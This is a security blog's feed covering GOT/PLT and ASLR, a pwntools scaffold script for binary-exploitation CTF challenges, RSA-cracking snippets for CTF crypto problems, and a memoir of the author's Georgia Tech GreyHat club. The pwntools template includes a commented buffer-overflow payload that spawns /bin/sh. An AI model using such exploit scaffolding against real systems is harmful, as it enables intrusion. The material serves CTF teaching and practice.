shared object is randomized.</p><p>Any program that wants to use code from a shared object needs to know where the code is located so it can be jumped to. However, if that location changes every time the program is run, then the program can’t hard code a location to jump to (i.e. it can’t say “oh you want to call <code>printf</code>? That code is always located at address 0x08048cba, just jump there”). So there needs to be a way to get the address at runtime. The image below explains how this is accomplished.</p><img src="/Defeating-ASLR-with-a-Leak/plt_got.png" class=""><p>The dynamic linker fills in a data structure with the addresses of each function in the shared object. This data structure is known as the Global Offset Table, and might look like the following.</p><table><thead><tr><th>Function</th><th>Address</th></tr></thead><tbody><tr><td><code>puts</code></td><td>Random virtual address of <code>puts</code></td></tr><tr><td><code>printf</code></td><td>Random virtual address of <code>printf</code></td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p>All the program needs to do is read the appropriate entry in the GOT and jump to it. But how does it know which entry in the GOT to read? It does this using something called the PLT.</p><ol><li>When a binary calls a function from a shared object, it jumps to some code in the PLT.</li><li>The PLT is a table full of chunks of instructions appended together. Each entry in the PLT does the following:<ul><li>Read an address from the GOT.</li><li>Jump to that address.</li></ul></li></ol><p>So the PLT looks something like this.</p><table><thead><tr><th>Function</th><th>Instructions</th></tr></thead><tbody><tr><td><code>puts</code></td><td>Code to lookup the <code>puts</code> address and call it.</td></tr><tr><td><code>printf</code></td><td>Code to lookup the <code>printf</code> address and call it.</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p>Awesome, we now know how programs jump to random function addresses! They just use the code in the PLT, which reads the random address from the GOT and jumps to it.</p><p>How does the GOT get its values filled in? The dynamic linker takes care of that for us, so we don’t care too much. However, it IS important to realize that the values in the GOT are initially empty. The GOT is only filled with the appropriate addresses after the first time that the function has been called. Before that, each entry in the GOT contains the address of something called a resolver.</p><p>If it’s the first time that a function has been called, the PLT code reads the address of the resolver from the GOT and jumps to it. The resolver fills in the GOT entry and then jumps to the real function address. After this initialization, we never need to call the resolver for this function again since the GOT entry has been filled. So really, our diagram should look like this.</p><img src="/Defeating-ASLR-with-a-Leak/dynamic_linking.jpg" class="">]]></content>
      
      
      
        <tags>
            
            <tag> Binary Exploitation </tag>
            
            <tag> ASLR </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Binary Exploit Initscript</title>
      <link href="//binexploit-init/"/>
      <url>//binexploit-init/</url>
      
        <content type="html"><![CDATA[<p>Binary exploit problems generally involve sending data to a binary and interpreting the output. This script uses the pwntools framework to automate much of the setup.</p><ol><li>Fill in the binary name, libc name, and whatever variables are needed for the remote binary.</li><li>Start a tmux window. The tmux window will split into two after the script runs - the left will have your binary’s output, and the right will have GDB.</li><li>Run <code>python run.py --&lt;mode&gt;</code> where mode indicates how you want to run the binary. Not putting a mode automatically runs the binary in GDB.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmdline argument - how to connect to binary</span></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--local&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Run exploit locally&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--attach&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Run exploit locally and attach debugger&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--remote&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Run exploit on remote service&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--ssh&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Run exploit on SSH server&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># GDB commands</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">gdb_cmd = [</span><br><span class="line"><span class="string">&quot;c&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Binary names</span></span><br><span class="line">bin_fname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">libc_fname = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remote</span></span><br><span class="line">IP = <span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH</span></span><br><span class="line">URL = <span class="string">&#x27;&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">bin_abs_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create ELF objects</span></span><br><span class="line">e = ELF(bin_fname)</span><br><span class="line">libc = ELF(libc_fname) <span class="keyword">if</span> libc_fname <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">x64 = e.bits != <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Command line args</span></span><br><span class="line"><span class="comment"># e.g. arg1 = cyclic_find(&#x27;ahaa&#x27;) * &#x27;a&#x27; + &#x27;\xbd\x86\x04\x08&#x27; + &#x27;a&#x27; * 4 + p32(next(e.search(&#x27;/bin/sh&#x27;)))</span></span><br><span class="line">arg1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">proc_args = [bin_fname, arg1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.remote:</span><br><span class="line">p = remote(IP, PORT)</span><br><span class="line"><span class="keyword">elif</span> args.local <span class="keyword">or</span> args.attach:</span><br><span class="line">p = process(proc_args)</span><br><span class="line"><span class="comment"># If line buffering is an issue:</span></span><br><span class="line">    <span class="comment"># p = process(proc_args, stdin=PTY, stdout=PTY)</span></span><br><span class="line"><span class="keyword">if</span> args.attach:</span><br><span class="line">gdb.attach(p, gdbscript=<span class="string">&quot;\n&quot;</span>.join(gdb_cmd))</span><br><span class="line"><span class="keyword">elif</span> args.ssh:</span><br><span class="line">s = ssh(host=URL, user=username, password=password)</span><br><span class="line">s.set_working_directory(bin_abs_path)</span><br><span class="line">p = s.process(proc_args)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = gdb.debug(proc_args, gdbscript=<span class="string">&quot;\n&quot;</span>.join(gdb_cmd))</span><br><span class="line">debugging = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Exploit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Examples:</span></span><br><span class="line"><span class="string">func_offset = libc.symbols[&#x27;puts&#x27;] # Offset in libc</span></span><br><span class="line"><span class="string">puts_addr = p32(e.got[&#x27;puts&#x27;])</span></span><br><span class="line"><span class="string">main = e.symbols[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">addr_string = next(e.search(&#x27;/bin/cat flag.txt&#x27;))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(cyclic(<span class="number">100</span>, n=<span class="number">8</span> <span class="keyword">if</span> x64 <span class="keyword">else</span> <span class="number">4</span>))</span><br><span class="line"><span class="comment"># buf = cyclic_find(&#x27;&#x27;, n=8 if x64 else 4) * &#x27;a&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Binary Exploitation </tag>
            
            <tag> Pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA Tool</title>
      <link href="/RSA-Tool/"/>
      <url>/RSA-Tool/</url>
      
        <content type="html"><![CDATA[<p>Many CTF competitions come with some kind of RSA cryptography challenge. These challenges vary in difficulty but usually use the same textbook RSA calculations. To speed up my solve times, I’ve created some simple scripts to help solve the most common RSA CTF challenges. Many of them are snippets I’ve found online and adapted to work with my utilities.</p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>Download the folder linked below and then install dependencies.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">virtualenv venv</span><br><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p><code>run.py</code> is the runner program. You can use all the functions in <code>attack_functions.py</code> and <code>pem_utilities.py</code>.</p><ol><li><p><code>attack_functions</code> contains functions that perform numerical attacks against RSA and provides some basic utilities, such as converting integers to ASCII text.</p></li><li><p><code>pem_utilities</code> contains functions that make it easier to work with PEM files or files that have been encrypted using openssl.</p></li></ol><h3 id="Online-Factorization"><a href="#Online-Factorization" class="headerlink" title="Online Factorization"></a>Online Factorization</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> attack_functions <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">28951349384423043218983050540262097638996616109955577558902029524079760750158684923657109854846122191130360573015845720440777033197971499589196069264739625195198815368193977724349036642939995805368573744328447244579642526857449768268753834475805477560338041038092683043149578111742677114084484145949297041276137332636132506885331222738476811693140185976545715701414240079516065192740228585267852582046443608026161708941442363792964096239980728739084441464942853065825759132585180831506997153733610602370711588167486294114891207572485931146617054305640945613324997820264892045579903140276482436750764783137418434959509</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">4531850464036745618300770366164614386495084945985129111541252641569745463086472656370005978297267807299415858324820149933137259813719550825795569865301790252501254180057121806754411506817019631341846094836070057184169015820234429382145019281935017707994070217705460907511942438972962653164287761695982230728969508370400854478181107445003385579261993625770566932506870421547033934140554009090766102575218045185956824020910463996496543098753308927618692783836021742365910050093343747616861660744940014683025321538719970946739880943167282065095406465354971096477229669290277771547093476011147370441338501427786766482964</span></span><br><span class="line"></span><br><span class="line">p, q = factordb(n)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">ascii</span>(given_p_q(c, e, n, p, q))</span><br></pre></td></tr></table></figure><h3 id="Working-with-PEMs"><a href="#Working-with-PEMs" class="headerlink" title="Working with PEMs"></a>Working with PEMs</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> attack_functions <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pem_utilities <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get all file names that end with .key or .enc (if necessary)</span></span><br><span class="line"><span class="comment"># key_files = glob.glob(&quot;./*.key&quot;)</span></span><br><span class="line"><span class="comment"># cipher_files = glob.glob(&quot;./*.enc&quot;)</span></span><br><span class="line"></span><br><span class="line">ciphertext_fname = <span class="string">&quot;flag.enc&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack the key, get factors</span></span><br><span class="line">p = <span class="number">0x00d1555acceb95d63216845cd1de64d6cc5ba6a878e9efb2d453b2fbd3c571a8993f804d449527f11e2c7d2f53e25afce5f99d38c5103772271be9ebaee09db41f</span></span><br><span class="line">q = <span class="number">0x00c93ceed82db2840160c52ed77b346ace00ff0b04a82f28f4ffa42c47362ec34bf885e4f8ef4304363addd5cee79f8d6cfead8b591d5167fd6168641a9fd6600d</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">priv_key = gen_private_key_p_q(n, long(e), p, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the ciphertext file</span></span><br><span class="line"><span class="comment"># decrypt_file(ciphertext_fname, priv_key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you desire more accuracy, write the private key to a file then decrypt using openssl</span></span><br><span class="line"><span class="comment"># openssl rsautl -decrypt -inkey private.pem &lt; ctfexample-text.txt</span></span><br><span class="line"><span class="comment"># Write PEM to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;private.pem&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> prv_file:</span><br><span class="line">    prv_file.write(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(priv_key.exportKey()))</span><br></pre></td></tr></table></figure><h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><ol><li>Small public modulus n - use <a href="https://factordb.com/index.php">https://factordb.com/index.php</a> to find p and q.</li><li>Given multiple keys - see if any of the keys have common factors using the Euclidean Algorithm.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fractions</span><br><span class="line"><span class="built_in">print</span>(fractions.gcd(a, b))</span><br></pre></td></tr></table></figure></li><li>p and q are close to each other - use YAFU or <a href="https://www.alpertron.com.ar/ECM.HTM">https://www.alpertron.com.ar/ECM.HTM</a></li><li>Two ciphertexts use the same modulus n but different exponents e - use: same_modulus.py</li><li>Small p or q - use YAFU or <a href="https://www.alpertron.com.ar/ECM.HTM">https://www.alpertron.com.ar/ECM.HTM</a></li><li>Large e or d - Wiener’s attack. Use attackrsa tool.</li><li>Same m and e for multiple messages - Hastad’s Broadcast Attack. Use attackrsa tool.</li><li>If num_ciphertexts &gt;&#x3D; e then you can use Chinese Remainder Theorem to calculate the message (but gcd of all n’s must be 1 - if the gcd between any two n’s is not 1, then you can just find a common factor between them).</li></ol><h2 id="External-Utility-Notes"><a href="#External-Utility-Notes" class="headerlink" title="External Utility Notes"></a>External Utility Notes</h2><p>Here are some commands to transform and work with keys.</p><p>Given n and d, print e, p, q.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -n 13826123222358393307 -d 9793706120266356337</span><br></pre></td></tr></table></figure><p>Given n and d, print PEM format.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd rsatool</span></span><br><span class="line">python rsatool.py -f PEM -o key_file.pem -n 13826123222358393307 -d 9793706120266356337</span><br></pre></td></tr></table></figure><p>Given p and q, print DER format.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd rsatool</span></span><br><span class="line">python rsatool.py -f DER -o key_file.der -p 4184799299 -q 3303891593</span><br></pre></td></tr></table></figure><p>Factorize with YAFU.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./yafu <span class="string">&quot;factor(0xD8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9)&quot;</span> -threads 5</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RSA </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GreyHat Reflections</title>
      <link href="/GreyHat-Reflections/"/>
      <url>/GreyHat-Reflections/</url>
      
        <content type="html"><![CDATA[<h2 id="Information-Security-at-Georgia-Tech"><a href="#Information-Security-at-Georgia-Tech" class="headerlink" title="Information Security at Georgia Tech"></a>Information Security at Georgia Tech</h2><p>I began my foray into information security as an 11th grader when my AP CS teacher told me about a competition hosted by CMU called picoCTF. Interested and motivated (partially by a grade), I decided to compete in a team with two friends. I only completed one challenge by the end, but I fell in love with the process of learning. I learned about bitwise operations for the reversing challenges and watched hours of RSA lectures on YouTube to crack the crypto challenges. Of course, my understanding was still rudimentary at best (I concluded that I was supposed to just factor <code>n</code> with a brute force script for the RSA challenge - ha!). In the end, though, I couldn’t believe how much I had learned in such a short time about topics I didn’t even know existed. It was then that I decided to make computer security my career.</p><p>Going into Georgia Tech, I wasn’t sure what kind of infosec community would exist (if any at all). I was very fortunate to find that there was a club called GreyHat that had a huge following and passionate officers. Unfortunately, I was still a newbie and had little knowledge of computers in general. It was difficult to understand everything, but I regularly attended the CTF meetings where we solved challenges together. At the end of the year, I ran for and was elected CTF captain for the next year. I didn’t know much but I wanted to see the club succeed and to pass on whatever little knowledge I had.</p><h2 id="CTF-Club"><a href="#CTF-Club" class="headerlink" title="CTF Club"></a>CTF Club</h2><p>Every Monday of my sophomore year, I’d fulfill my usual regimen of going to class, finishing homework, and (sometimes) hitting the gym. Around 7PM, after most people on campus had headed back to their dorms or the library, a group of passionate nerds and I would meet in an unused, cramped study space at the top floor of the CoC. Each week, I created a set of problems for the students to work through, each time teaching something new about the vast world of computers.</p><img src="/GreyHat-Reflections/ctfmeeting.jpg" class=""><p>Of all the things I did in college, running CTF meetings was probably my favorite. I spent my time with an amazing group of people ranging from your typical computer science students to even mechanical engineers as they formed groups to tackle my problems. Later, many of them even became my close friends outside of GreyHat.</p><p>I can’t describe what an awesome feeling it was to see the relieved looks on everyone’s faces when they finally solved a problem after an hour of struggling through it. It was that same feeling that had led me to love computer security, and I was thrilled that I could pass it on to others.</p><h2 id="CSAW-CTF-Experience"><a href="#CSAW-CTF-Experience" class="headerlink" title="CSAW CTF Experience"></a>CSAW CTF Experience</h2><p>In the fall, we decided to compete online in the annual CSAW CTF Competition. We reserved our usual room, made pancakes and scrambled eggs to fuel us through, and called in some alumni (like the legendary Chris Grayson) for a whole weekend of hacking fun.</p><p>Somehow, by the end of the weekend, our Georgia Tech team ended up in 57th place out of 1367 teams in the competition. As it turned out, though, our team was 13th among the top 15 teams that qualified to go to the finals in New York City - so we did!</p><img src="/GreyHat-Reflections/csaw.jpg" class=""><p>At CSAW finals, three others and I worked through a 36 hour non-stop hacking session on the problems we were given. While we jammed out to music and munched through an endless supply of free food for competitors, we solved many problems and learned many new things. I was still relatively inexperienced when I went, but I did manage to solve two challenges - a PDF forensics challenge worth 300 points and a simple file carving problem worth 50 points.</p><p>We didn’t win at the end of the competition but I did have one of the most fun hacking experiences of my life. It was an amazing feeling to be surrounded by so many intelligent people who shared the same passion as me. I highly recommend anyone interested in security at all to get their hands dirty with CTFs.</p><h2 id="GreyH-t-CTF"><a href="#GreyH-t-CTF" class="headerlink" title="GreyH@t CTF"></a>GreyH@t CTF</h2><p>In the spring of 2016, GreyHat decided to revive its own annual CTF competition. We opened up the competition to undergraduate and masters students so that we could cater to a wide range of students without giving too much of an edge to higher level students.</p><img src="/GreyHat-Reflections/poster.jpg" class=""><p>The competition received sponsorship from Capital One, which generously provided us with a $400 prize pool and even bought Moe’s catering. As members of GreyHat’s board, Manas George, Max Bires, and I authored a list of puzzles to be solved during the competition. We set up an instance of RootTheBox using AWS and let everyone work on the problems for nearly 8 hours.</p><img src="/GreyHat-Reflections/greyh@tctf2016.jpg" class=""><p>Overall, it was a great success and everyone seemed to enjoy our CTF competition. You could visibly see the frustration on competitors’ faces as the competition was coming to a close and as they rushed to solve problems. It was a good kind of frustration; the kind that you learn from. I’m looking forward to doing something like this again in the future.</p><h2 id="GreyHat-Presidency"><a href="#GreyHat-Presidency" class="headerlink" title="GreyHat Presidency"></a>GreyHat Presidency</h2><p>The following year, I was elected president of GreyHat. Being president meant that I was responsible for communicating with club members and faculty, organizing funding for club events, and most importantly, getting presentations for our regular meetings. I can honestly say that I was not prepared for the amount of work it was going to be - and I mostly blame my own lack of security knowledge. More than once I spent a weekend doing research on security topics I was unfamiliar with myself in order to give a presentation on it that week.</p><p>If I could have given myself one piece of advice, it would be to give more practice problems and fewer lectures. People really learn from doing problems together (something I had already figured out as CTF captain, duh!).</p><p>Despite my shortcomings, I really enjoyed getting to know the club members who were interested in what I taught and regularly came to my meetings. As I start my next chapter at UC Santa Barbara, I can only hope that the infosec community I meet will be as awesome and welcoming as the one I found at Georgia Tech.</p><h2 id="Presentation-Archive"><a href="#Presentation-Archive" class="headerlink" title="Presentation Archive"></a>Presentation Archive</h2><p>Here is a list of all the presentations I’ve given for anyone that’s interested.</p><h3 id="President-Presentations"><a href="#President-Presentations" class="headerlink" title="President Presentations"></a>President Presentations</h3><p>04-13-17: <a href="presentations/04-13-17_Elections_and_Password_Hashing.pptx">Elections and Password Hashing</a><br>02-02-17: <a href="presentations/02-02-17_How_to_Become_Invisible_Tor_and_VPNs.pptx">Invisibility on the Web - Tor and VPNs</a> (see <a href="https://www.youtube.com/watch?v=Uks8UDiI3Ss">here</a> for YouTube Talk)<br>01-26-17: <a href="https://www.youtube.com/watch?v=GMCCHY8Mzfo">Remote Tutorial - Kali Linux Virtual Machine Setup</a><br>01-19-17: <a href="presentations/01-19-17_Greyhat_Intro_2.pptx">GreyHat Introduction 2</a><br>12-01-16: Web-App CTF Challenge<br>11-03-16: <a href="presentations/11-03-16_Padding_Oracle_Attacks.pptx">Padding Oracle Attacks</a><br>09-29-16: <a href="presentations/11-16-15_CSAW15_Forensics_Problem.tar.gz">Forensics&#x2F;Stego Problem</a> (repeat of 11-16-15)<br>09-15-16: <a href="presentations/09-15-16_GreyHat_SQL_Injection.pptx">SQL Injection</a><br>09-01-16: <a href="presentations/09-01-16_GreyHat_Intro.pptx">GreyHat Introduction</a><br>04-07-16: <a href="presentations/04-07-16_Cross_Site_Scripting.pptx">Cross Site Scripting</a></p><h3 id="CTF-Captain-Problems"><a href="#CTF-Captain-Problems" class="headerlink" title="CTF Captain Problems"></a>CTF Captain Problems</h3><p><a href="presentations/CTF-Problems.zip">My GreyH@t CTF 2016 Problems</a><br>11-16-15: <a href="presentations/11-16-15_CSAW15_Forensics_Problem.tar.gz">CSAW’15 Forensics Problem</a><br>11-02-15: <a href="presentations/11-02-15_Crypto_Practice_Problems.zip">Crypto Practice Problems</a><br>10-05-15: <a href="presentations/10-05-15_Steganography.zip">Steganography</a><br>09-28-15: <a href="presentations/09-28-15_Practice_Problems.zip">Practice Problems</a><br>09-21-15: <a href="presentations/09-21-15_Beginner_Crypto.zip">Beginner Crypto</a></p><h3 id="Presentations-Not-Given"><a href="#Presentations-Not-Given" class="headerlink" title="Presentations Not Given"></a>Presentations Not Given</h3><p><a href="presentations/GreyHat_OneTimePad.pptx">One Time Pad</a><br><a href="presentations/GreyHat_Crypto_History.pptx">History of Cryptography</a></p><h3 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h3><p>Sometime in 2016, I had the pleasure of welcoming a security researcher from Booz Allen Hamilton named Dr. Malachi Jones to talk at GreyHat. Malachi also happened to be a graduate of Georgia Tech and ended up convincing me to work at Booz Allen for my next internship. I’ve included his presentation here as well because I thought it was really well put together and very informative.</p><p><a href="presentations/Automating_Analysis_and_Exploitation_of_Embedded_Device_Firmware.pdf">Automating_Analysis_and_Exploitation_of_Embedded_Device_Firmware.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> GreyHat </tag>
            
            <tag> CTF </tag>
            
            <tag> Georgia Tech </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
